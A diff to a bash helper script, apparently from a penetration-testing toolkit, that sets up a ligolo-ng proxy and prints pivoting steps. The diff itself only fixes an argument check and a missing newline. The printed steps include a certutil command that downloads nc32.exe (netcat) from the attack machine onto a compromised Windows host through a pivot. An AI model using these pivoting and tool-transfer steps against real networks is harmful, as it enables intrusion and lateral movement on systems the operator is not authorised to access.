@@ -6,7 +6,7 @@ GREEN="\e[32m"
 ENDCOLOR="\e[0m"
 
 # Check arguments
-if [ $# -eq 0 ]
+if [ $# -ne 1 ]
   then
     echo "No arguments supplied. Please supply a valid target IP address"
     exit
@@ -61,7 +61,7 @@ printf "1. Add a listener in the ligolo proxy shell:  ${RED}\nlistener add --add
 printf "2. List listeners to confirm listener creation: ${RED}\nlistener_list${ENDCOLOR}\n"
 printf "3. Create python http server on attack machine: ${RED}\npython3 -m http.server 4445${ENDCOLOR}\n"
 printf "4. Download file using pivoted machine IP. A hit to port 4445 on the pivoted machine will forward traffic to 4445 on our attack machine:${RED}\ncertutil -urlcache -split -f http://$1:4445/nc32.exe${ENDCOLOR}\n"
-printf "5. Observe a hit on port 4445 on our python webserver"
+printf "5. Observe a hit on port 4445 on our python webserver\n"
 
 # Start ligolo proxy but push it in the background
 ./proxy -selfcert
